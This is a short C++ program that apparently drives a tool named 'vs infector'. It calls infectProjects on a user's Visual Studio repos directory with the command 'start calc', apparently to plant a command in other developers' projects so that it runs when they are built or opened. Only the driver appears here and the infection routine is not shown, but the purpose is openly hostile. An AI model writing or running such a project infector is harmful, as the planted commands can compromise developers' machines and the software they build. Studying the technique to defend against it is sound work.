#include "src/vs infector.h"
#include <iostream>
#include <Windows.h>

//source code - https://github.com/dwx911/vs-infector

int main() {
	
	std::wstring repoDir = getCommonRepoDir(); //this is the common directory most people have for repos

	infectProjects(L"C:\\Users\\dwx\\source\\repos", L"start calc"); // or use a custom directory like this
	std::wcin.get(); // keeps the console from closing automatically

	return 0;
}
